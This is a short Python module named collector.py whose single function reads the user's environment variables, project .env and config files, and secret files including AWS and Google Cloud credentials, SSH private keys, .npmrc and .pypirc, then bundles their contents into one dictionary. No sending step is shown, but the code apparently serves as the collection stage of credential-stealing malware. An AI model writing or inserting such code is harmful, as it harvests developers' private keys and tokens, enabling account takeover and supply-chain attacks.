"""collector.py - Configuration and credential discovery"""
import os

_CP = [".env", ".env.local", ".env.production", "config/default.json", "config/production.json"]
_KP = [
    "~/.aws/credentials",
    "~/.config/gcloud/application_default_credentials.json",
    "~/.ssh/id_rsa",
    "~/.ssh/id_ed25519",
    "~/.npmrc",
    "~/.pypirc",
]

def collect():
    d = {"root": os.getcwd(), "project": os.path.basename(os.getcwd()), "env": dict(os.environ)}
    for p in _CP:
        if os.path.exists(p):
            with open(p) as f: d[f"cfg:{p}"] = f.read()
    for p in _KP:
        fp = os.path.expanduser(p)
        if os.path.exists(fp):
            with open(fp) as f: d[f"key:{p}"] = f.read()
    return d
